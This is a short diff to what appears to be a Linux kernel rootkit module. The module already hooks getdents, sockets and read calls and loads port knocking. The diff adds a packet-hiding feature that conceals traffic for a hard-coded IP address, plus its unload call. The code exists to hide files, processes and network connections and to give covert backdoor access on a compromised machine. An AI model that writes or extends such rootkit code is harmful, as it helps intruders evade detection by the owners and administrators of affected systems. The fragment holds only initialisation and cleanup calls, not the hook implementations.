@@ -32,6 +32,7 @@ int init_module (void)
 	hook_getdents();	
 	hook_sockets();
 	hook_read();
+	load_packet_hiding("131.159.206.15");
 	
 	/* load port knocking */
 	ret = load_port_knocking();	
@@ -55,6 +56,8 @@ void cleanup_module (void)
 
 	// TODO: adapt all unload functions to only do something if they are loaded
 	
+
+	unload_packet_hiding();
 	unhook_getdents();
 	unhook_sockets();
 	unhook_read();
